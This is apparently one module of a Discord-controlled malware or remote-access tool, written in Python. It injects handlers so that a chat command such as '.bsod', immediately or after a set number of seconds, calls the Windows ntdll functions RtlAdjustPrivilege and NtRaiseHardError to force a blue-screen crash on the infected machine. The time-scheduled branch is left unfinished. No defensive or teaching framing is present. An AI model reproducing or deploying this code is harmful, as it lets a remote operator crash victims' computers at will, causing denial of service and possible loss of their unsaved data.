
# THIS COMPONENT WILL:
# contain the command to instantly send a BSOD, send one at a specific time and also one with a timer in seconds
# ----------------------
# TODO:
# -BSOD
# -BSOD -t <12:34> | do it now if its the time, if not make a countdown to that time.
# -BSOD -s <int> | send a BSOD in <int> seconds
def get_code():
    return """
    # ADDED BSOD MODULE
    elif message.content.lower() == ".bsod":
        import ctypes
        import asyncio
        # Here is the code to send a BSOD
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        await message.channel.send("```diff\n- BSOD\n```")

    
    elif message.content.lower().startswith(".bsod -t"):
        # Here is the code to send a BSOD at a specific time
        time = message.content[9:]
        await message.channel.send("```diff\n- BSOD\n```")
        
    elif message.content.lower().startswith(".bsod -s"):
        # Here is the code to send a BSOD with a timer
        time = message.content[9:]
        await asyncio.sleep(int(time))
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        await message.channel.send("```diff\n- BSOD\n```")
        
"""